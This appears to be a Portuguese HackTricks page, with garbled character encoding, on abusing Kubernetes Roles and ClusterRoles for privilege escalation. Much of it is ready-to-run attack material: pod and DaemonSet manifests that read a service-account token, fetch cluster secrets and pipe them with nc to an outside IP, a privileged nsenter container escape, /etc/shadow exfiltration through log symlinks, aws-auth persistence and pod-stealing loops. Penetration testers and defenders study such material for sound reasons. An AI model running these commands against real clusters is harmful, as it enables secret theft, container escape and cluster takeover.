# Abusando de Fun√ß√µes/ClusterRoles no Kubernetes

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.

</details>

Aqui voc√™ pode encontrar algumas configura√ß√µes de Roles e ClusterRoles potencialmente perigosas.\
Lembre-se de que voc√™ pode obter todos os recursos suportados com `kubectl api-resources`

## **Eleva√ß√£o de Privil√©gios**

Referindo-se √† arte de obter **acesso a um principal diferente** dentro do cluster **com privil√©gios diferentes** (dentro do cluster Kubernetes ou em nuvens externas) dos que voc√™ j√° possui, no Kubernetes existem basicamente **4 t√©cnicas principais para elevar privil√©gios**:

* Ser capaz de **se passar por** outros usu√°rios/grupos/SAs com privil√©gios melhores dentro do cluster Kubernetes ou em nuvens externas
* Ser capaz de **criar/alterar/executar pods** onde voc√™ pode **encontrar ou anexar SAs** com privil√©gios melhores dentro do cluster Kubernetes ou em nuvens externas
* Ser capaz de **ler segredos** pois os tokens dos SAs s√£o armazenados como segredos
* Ser capaz de **escapar para o n√≥** a partir de um cont√™iner, onde voc√™ pode roubar todos os segredos dos cont√™ineres em execu√ß√£o no n√≥, as credenciais do n√≥ e as permiss√µes do n√≥ dentro da nuvem em que est√° sendo executado (se houver)
* Uma quinta t√©cnica que merece men√ß√£o √© a capacidade de **executar port-forward** em um pod, pois voc√™ pode ser capaz de acessar recursos interessantes dentro desse pod.

### **Acessar Qualquer Recurso ou Verbo (Wildcard)**

Esse privil√©gio fornece acesso a **qualquer recurso com qualquer verbo**. √â o privil√©gio mais substancial que um usu√°rio pode obter, especialmente se esse privil√©gio tamb√©m for um "ClusterRole". Se for um "ClusterRole", o usu√°rio pode acessar os recursos de qualquer namespace e possuir o cluster com essa permiss√£o.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **Acesso a qualquer recurso**

Dar permiss√£o a um usu√°rio para **acessar qualquer recurso pode ser muito arriscado**. Mas, **quais verbos** permitem o acesso a esses recursos? Aqui est√£o algumas permiss√µes perigosas de RBAC que podem danificar todo o cluster:

* **resources: \["\*"] verbs: \["create"]** - Esse privil√©gio pode **criar qualquer recurso** no cluster, como **pods**, roles, etc. Um atacante pode abusar disso para **elevar privil√©gios**. Um exemplo disso pode ser encontrado na se√ß√£o **"Cria√ß√£o de Pods"**.
* **resources: \["\*"] verbs: \["list"]** - A capacidade de listar qualquer recurso pode ser usada para **vazar segredos de outros usu√°rios** e pode facilitar a **eleva√ß√£o de privil√©gios**. Um exemplo disso est√° localizado na se√ß√£o **"Listagem de segredos"**.
* **resources: \["\*"] verbs: \["get"]** - Esse privil√©gio pode ser usado para **obter segredos de outras contas de servi√ßo**.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Criar Pod - Roubar Token

Um invasor com permiss√£o para criar um pod no namespace "kube-system" pode criar containers de criptominera√ß√£o, por exemplo. Al√©m disso, se houver uma **conta de servi√ßo com permiss√µes privilegiadas, ao executar um pod com esse servi√ßo, as permiss√µes podem ser abusadas para elevar privil√©gios**.

Aqui temos uma conta privilegiada padr√£o chamada _bootstrap-signer_ com permiss√µes para listar todos os segredos.

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

O invasor pode criar um pod malicioso que usar√° o servi√ßo privilegiado. Em seguida, abusando do token de servi√ßo, ele exfiltrar√° os segredos:

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
Na imagem anterior, observe como o servi√ßo _bootstrap-signer √© usado em_ `serviceAccountname`_._

Portanto, basta criar o pod malicioso e esperar pelos segredos na porta 6666:

### **Cria√ß√£o e Escape do Pod**

A seguinte defini√ß√£o concede todos os privil√©gios que um cont√™iner pode ter:

* **Acesso privilegiado** (desabilitando prote√ß√µes e definindo capacidades)
* **Desabilitar os namespaces hostIPC e hostPid** que podem ajudar a elevar privil√©gios
* **Desabilitar o namespace hostNetwork**, fornecendo acesso para roubar privil√©gios da nuvem dos n√≥s e melhor acesso √†s redes
* **Montar o / do host dentro do cont√™iner**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Crie o pod com:
```bash
kubectl --token $token create -f mount_root.yaml
```
Uma linha de [um tweet](https://twitter.com/mauilion/status/1129468485480751104) e com algumas adi√ß√µes:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Agora que voc√™ pode escapar para o n√≥, verifique as t√©cnicas de p√≥s-explora√ß√£o em:

#### Furtividade

Provavelmente voc√™ quer ser **mais furtivo**, nas p√°ginas a seguir voc√™ pode ver o que seria capaz de acessar se criar um pod habilitando apenas alguns dos privil√©gios mencionados no modelo anterior:

* **Privilegiado + hostPID**
* **Apenas privilegiado**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Voc√™ pode encontrar exemplos de como criar/abusar das configura√ß√µes de pods privilegiados anteriores em_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Cria√ß√£o de Pod - Mover para a nuvem

Se voc√™ pode **criar** um **pod** (e opcionalmente uma **conta de servi√ßo**), pode ser capaz de **obter privil√©gios no ambiente de nuvem** atribuindo fun√ß√µes de nuvem a um pod ou a uma conta de servi√ßo e, em seguida, acessando-o.\
Al√©m disso, se voc√™ pode criar um **pod com o namespace de rede do host**, pode **roubar a fun√ß√£o IAM** da inst√¢ncia do **n√≥**.

Para mais informa√ß√µes, consulte:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Criar/Alterar Implanta√ß√£o, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs e Cronjobs**

Implanta√ß√£o, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs e Cronjobs s√£o todos privil√©gios que permitem a cria√ß√£o de diferentes tarefas no cluster. Al√©m disso, √© poss√≠vel us√°-los para **desenvolver pods e at√© mesmo criar pods**. Portanto, √© poss√≠vel **abusar deles para escalar privil√©gios, assim como no exemplo anterior**.

Suponha que tenhamos a **permiss√£o para criar um Daemonset** e criamos o seguinte arquivo YAML. Este arquivo YAML est√° configurado para executar as mesmas etapas mencionadas na se√ß√£o "criar pods".
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
Na linha 6, voc√™ pode encontrar o objeto "spec" e objetos filhos como "**template**" na linha 10. Esses objetos cont√™m a configura√ß√£o para a tarefa que desejamos realizar. Outra coisa a ser observada √© o "**serviceAccountName**" na linha 15 e o objeto "**containers**" na linha 18. Esta √© a parte que se relaciona √† cria√ß√£o do nosso container malicioso.

A documenta√ß√£o da API do Kubernetes indica que o endpoint "**PodTemplateSpec**" tem a op√ß√£o de criar containers. E, como voc√™ pode ver: **implanta√ß√£o, daemonsets, statefulsets, replicationcontrollers, replicasets, jobs e cronjobs podem ser usados para criar pods**:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**Portanto, o privil√©gio de criar ou atualizar tarefas tamb√©m pode ser abusado para escalonamento de privil√©gios no cluster.**

### **Execu√ß√£o de Pods**

**`pods/exec`** √© um recurso no Kubernetes usado para **executar comandos em um shell dentro de um pod**. Esse privil√©gio √© destinado a administradores que desejam **acessar containers e executar comandos**. √â como criar uma sess√£o SSH para o container.

Se tivermos esse privil√©gio, na verdade, obtemos a capacidade **de assumir o controle de todos os pods**. Para fazer isso, precisamos usar o seguinte comando:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
Observe que, assim como na explora√ß√£o da cria√ß√£o de pods, voc√™ pode abusar do token de outros pods para tentar elevar privil√©gios.

### port-forward

Essa permiss√£o permite **encaminhar uma porta local para uma porta espec√≠fica no pod especificado**. Isso √© destinado a facilitar a depura√ß√£o de aplicativos em execu√ß√£o dentro de um pod, mas um invasor pode abusar disso para obter acesso a aplicativos interessantes (como bancos de dados) ou vulner√°veis (webs?) dentro de um pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### **Escape de Escrita em Hosts /var/log/**

Conforme [indicado nesta pesquisa](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), se voc√™ pode acessar ou criar um pod com o diret√≥rio **`/var/log/` do host montado** nele, voc√™ pode **escapar do container**.\
Isso ocorre basicamente porque quando o **Kube-API tenta obter os logs** de um container (usando `kubectl logs <pod>`), ele **solicita o arquivo `0.log`** do pod usando o endpoint `/logs/` do servi√ßo **Kubelet**.\
O servi√ßo Kubelet exp√µe o endpoint `/logs/`, que basicamente **exp√µe o sistema de arquivos `/var/log` do container**.

Portanto, um invasor com **acesso para escrever na pasta /var/log/ do container** pode abusar desse comportamento de duas maneiras:

* Modificando o arquivo `0.log` do seu container (geralmente localizado em `/var/logs/pods/namespace_pod_uid/container/0.log`) para ser um **link simb√≥lico apontando para `/etc/shadow`**, por exemplo. Em seguida, voc√™ poder√° exfiltrar o arquivo shadow do host fazendo:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Se o atacante controlar qualquer principal com as **permiss√µes para ler `nodes/log`**, ele pode simplesmente criar um **link simb√≥lico** em `/host-mounted/var/log/sym` para `/` e, ao **acessar `https://<gateway>:10250/logs/sym/`, ele listar√° o sistema de arquivos raiz dos hosts** (alterar o link simb√≥lico pode fornecer acesso a arquivos).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Um laborat√≥rio e um exploit automatizado podem ser encontrados em** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassando a prote√ß√£o de somente leitura do hostPath <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Se voc√™ tiver sorte o suficiente e a capacidade altamente privilegiada `CAP_SYS_ADMIN` estiver dispon√≠vel, voc√™ pode simplesmente remontar a pasta como rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassando a prote√ß√£o de somente leitura do hostPath <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Conforme mencionado nesta [**pesquisa**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), √© poss√≠vel contornar a prote√ß√£o:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
O objetivo era evitar escapes como os anteriores, em vez de usar uma montagem hostPath, usar um PersistentVolume e um PersistentVolumeClaim para montar uma pasta do host no cont√™iner com acesso de grava√ß√£o:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonando contas privilegiadas**

Com um privil√©gio de [**impersona√ß√£o de usu√°rio**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), um atacante pode se passar por uma conta privilegiada.

Neste exemplo, a conta de servi√ßo _**sa-imper**_ tem uma associa√ß√£o a um ClusterRole com regras que permitem a impersona√ß√£o de grupos e usu√°rios.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

√â poss√≠vel **listar todos os segredos** com os atributos `--as=null --as-group=system:master`:

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**Tamb√©m √© poss√≠vel realizar a mesma a√ß√£o por meio do endpoint da API REST:**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **Listando Segredos**

O **privil√©gio de listar segredos** √© uma capacidade forte de se ter no cluster. Um usu√°rio com permiss√£o para listar segredos pode **potencialmente visualizar todos os segredos no cluster - incluindo as chaves de administra√ß√£o**. A chave secreta √© um token JWT codificado em base64.

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

Um atacante que ganha **acesso a \_list secrets**\_ no cluster pode usar os seguintes comandos _curl_ para obter todos os segredos no namespace "kube-system":
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Lendo um segredo - for√ßando IDs de token**

Um invasor que encontrou um token com permiss√£o para ler um segredo n√£o pode usar essa permiss√£o sem saber o nome completo do segredo. Essa permiss√£o √© diferente da permiss√£o de _**listar**_ _**segredos**_ descrita acima.

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

Embora o invasor n√£o saiba o nome do segredo, existem contas de servi√ßo padr√£o que podem ser listadas.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

Cada conta de servi√ßo tem um segredo associado com um prefixo est√°tico (n√£o mut√°vel) e um sufixo de um token de string aleat√≥ria de cinco caracteres no final.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

A estrutura do token aleat√≥rio √© uma string de cinco caracteres constru√≠da a partir de caracteres alfanum√©ricos (letras min√∫sculas e d√≠gitos). **Mas n√£o cont√©m todas as letras e d√≠gitos.**

Ao examinar o [c√≥digo-fonte](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), parece que o token √© gerado apenas a partir de 27 caracteres "bcdfghjklmnpqrstvwxz2456789" e n√£o 36 (a-z e 0-9).

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

Isso significa que existem 275 = 14.348.907 possibilidades para um token.

Um invasor pode executar um ataque de for√ßa bruta para adivinhar o ID do token em algumas horas. Ter sucesso em obter segredos de contas de servi√ßo padr√£o sens√≠veis permitir√° que ele eleve os privil√©gios.

### Solicita√ß√µes de Assinatura de Certificado

Se voc√™ tiver os verbos **`create`** no recurso `certificatesigningrequests` (ou pelo menos em `certificatesigningrequests/nodeClient`). Voc√™ pode **criar** um novo CeSR de um **novo n√≥**.

De acordo com a [documenta√ß√£o, √© poss√≠vel aprovar automaticamente essas solicita√ß√µes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), ent√£o, nesse caso, voc√™ **n√£o precisa de permiss√µes extras**. Caso contr√°rio, voc√™ precisaria ser capaz de aprovar a solicita√ß√£o, o que significa atualizar em `certificatesigningrequests/approval` e `approve` em `signers` com o nome do recurso `<signerNameDomain>/<signerNamePath>` ou `<signerNameDomain>/*`.

Um **exemplo de uma fun√ß√£o** com todas as permiss√µes necess√°rias √©:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Ent√£o, com o novo CSR do n√≥ aprovado, voc√™ pode **abusar** das permiss√µes especiais dos n√≥s para **roubar segredos** e **elevar privil√©gios**.

Neste [**post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) e [**neste outro**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), a configura√ß√£o de inicializa√ß√£o autom√°tica do TLS do GKE K8s √© configurada com **assinatura autom√°tica** e √© abusada para gerar credenciais de um novo n√≥ K8s e, em seguida, abusar delas para elevar privil√©gios roubando segredos.\
Se voc√™ **possuir as permiss√µes mencionadas, poder√° fazer a mesma coisa**. Observe que o primeiro exemplo contorna o erro que impede um novo n√≥ de acessar segredos dentro de cont√™ineres, porque um **n√≥ s√≥ pode acessar os segredos dos cont√™ineres montados nele**.

A maneira de contornar isso √© simplesmente **criar credenciais de n√≥ para o nome do n√≥ onde o cont√™iner com os segredos interessantes est√° montado** (mas verifique como fazer isso no primeiro post):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Os princ√≠pios que podem modificar **`configmaps`** no namespace kube-system em clusters EKS (precisam estar na AWS) podem obter privil√©gios de administrador do cluster sobrescrevendo o configmap **aws-auth**.\
Os verbos necess√°rios s√£o **`update`** e **`patch`**, ou **`create`** se o configmap n√£o foi criado:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Voc√™ pode usar **`aws-auth`** para **persist√™ncia** dando acesso a usu√°rios de **outras contas**.

No entanto, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **n√£o funciona de uma conta diferente**. Mas na verdade, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funciona se voc√™ colocar o ARN do cluster em vez de apenas o nome.\
Para fazer o `kubectl` funcionar, certifique-se de **configurar** o **kubeconfig da v√≠tima** e nos argumentos de execu√ß√£o da aws adicione `--profile other_account_role` para que o kubectl use o perfil da outra conta para obter o token e entrar em contato com a AWS.
{% endhint %}

### Escalando no GKE

Existem **2 maneiras de atribuir permiss√µes do K8s a princ√≠pios do GCP**. Em qualquer caso, o princ√≠pio tamb√©m precisa da permiss√£o **`container.clusters.get`** para poder obter credenciais de acesso ao cluster, ou voc√™ precisar√° **gerar seu pr√≥prio arquivo de configura√ß√£o do kubectl** (siga o pr√≥ximo link).

{% hint style="warning" %}
Ao falar com o endpoint da API do K8s, o **token de autentica√ß√£o do GCP ser√° enviado**. Em seguida, o GCP, por meio do endpoint da API do K8s, verificar√° primeiro se o princ√≠pio (por e-mail) tem algum acesso dentro do cluster e, em seguida, verificar√° se ele tem algum acesso via GCP IAM.\
Se **qualquer um** desses for **verdadeiro**, ele ser√° **respondido**. Se **n√£o**, um **erro** sugerindo dar **permiss√µes via GCP IAM** ser√° fornecido.
{% endhint %}

A primeira maneira √© usar o **GCP IAM**, as permiss√µes do K8s t√™m suas **permiss√µes equivalentes do GCP IAM**, e se o princ√≠pio tiver, ele poder√° us√°-las.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

A segunda maneira √© **atribuir permiss√µes do K8s dentro do cluster** identificando o usu√°rio pelo seu **e-mail** (incluindo contas de servi√ßo do GCP).

### Criar token de serviceaccounts

Princ√≠pios que podem **criar TokenRequests** (`serviceaccounts/token`) podem emitir tokens para SAs equivalentes a administrador (informa√ß√µes da [**qui**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Princ√≠pios que podem **`atualizar`** ou **`patch`** **`pods/ephemeralcontainers`** podem obter **execu√ß√£o de c√≥digo em outros pods** e potencialmente **escapar** para seu n√≥ adicionando um container ef√™mero com um securityContext privilegiado.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Princ√≠pios com qualquer um dos verbos `create`, `update` ou `patch` sobre `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` podem ser capazes de **criar uma dessas webhookconfigurations** para poder **escalar privil√©gios**.

Para um exemplo de [`mutatingwebhookconfigurations, verifique esta se√ß√£o deste post`](./#malicious-admission-controller).

### Escalar

Como voc√™ pode ler na pr√≥xima se√ß√£o: [**Preven√ß√£o de Escala√ß√£o de Privil√©gios Incorporada**](./#built-in-privileged-escalation-prevention), um princ√≠pio n√£o pode atualizar nem criar fun√ß√µes ou fun√ß√µes de cluster sem ter essas novas permiss√µes. Exceto se ele tiver o **verbo `escalate`** sobre **`roles`** ou **`clusterroles`.**\
Ent√£o ele pode atualizar/criar novas fun√ß√µes, fun√ß√µes de cluster com permiss√µes melhores do que as que ele tem.

### Nodes proxy

Princ√≠pios com acesso ao subrecurso **`nodes/proxy`** podem **executar c√≥digo em pods** por meio da API Kubelet (de acordo com [**isso**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Mais informa√ß√µes sobre autentica√ß√£o do Kubelet nesta p√°gina:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Voc√™ tem um exemplo de como obter [**RCE falando autorizado com uma API Kubelet aqui**](../pentesting-kubernetes-services.md#kubelet-rce).

### Excluir pods + n√≥s n√£o escalon√°veis

Princ√≠pios que podem **excluir pods** (verbo `delete` sobre o recurso `pods`), ou **expulsar pods** (verbo `create` sobre o recurso `pods/eviction`), ou **alterar o status do pod** (acesso a `pods/status`) e podem **tornar outros n√≥s n√£o escalon√°veis** (acesso a `nodes/status`) ou **excluir n√≥s** (verbo `delete` sobre o recurso `nodes`) e t√™m controle sobre um pod, podem **roubar pods de outros n√≥s** para que sejam **executados** no **n√≥ comprometido** e o atacante possa **roubar os tokens** desses pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status dos Servi√ßos (CVE-2020-8554)

Principais que podem **modificar** **`services/status`** podem definir o campo `status.loadBalancer.ingress.ip` para explorar a **CVE-2020-8554 n√£o corrigida** e lan√ßar ataques **MiTM contra o cluster**. A maioria das mitiga√ß√£o para a CVE-2020-8554 apenas previne servi√ßos ExternalIP (de acordo com [**este**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status dos N√≥s e Pods

Principais com permiss√µes de **`update`** ou **`patch`** sobre `nodes/status` ou `pods/status`, podem modificar r√≥tulos para afetar as restri√ß√µes de agendamento impostas.

## Preven√ß√£o de Escala√ß√£o de Privil√©gios Incorporada

Embora possam existir permiss√µes arriscadas, o Kubernetes est√° fazendo um bom trabalho ao prevenir outros tipos de permiss√µes com potencial para escalonamento de privil√©gios.

O Kubernetes possui um [mecanismo incorporado](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) para isso:

> A API RBAC **impede que os usu√°rios aumentem os privil√©gios** ao editar fun√ß√µes ou vincula√ß√µes de fun√ß√µes. Como isso √© aplicado no n√≠vel da API, ele se aplica mesmo quando o autorizador RBAC n√£o est√° em uso.
>
> Um usu√°rio s√≥ pode **criar/atualizar uma fun√ß√£o se ele j√° tiver todas as permiss√µes contidas na fun√ß√£o**, no mesmo escopo da fun√ß√£o (em todo o cluster para um ClusterRole, dentro do mesmo namespace ou em todo o cluster para um Role)

{% hint style="warning" %}
H√° uma exce√ß√£o para a regra anterior. Se um principal tiver o **verbo `escalate`** sobre **`roles`** ou **`clusterroles`**, ele pode aumentar os privil√©gios de fun√ß√µes e clusterroles mesmo sem ter as permiss√µes necess√°rias.
{% endhint %}

Vamos ver um exemplo dessa preven√ß√£o.

Uma conta de servi√ßo chamada _sa7_ est√° em um RoleBinding _edit-role-rolebinding_. Esse objeto RoleBinding tem uma fun√ß√£o chamada _edit-role_ que possui **regras de permiss√µes completas** em fun√ß√µes. Teoricamente, isso significa que a conta de servi√ßo pode **editar qualquer fun√ß√£o** no namespace _default_.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

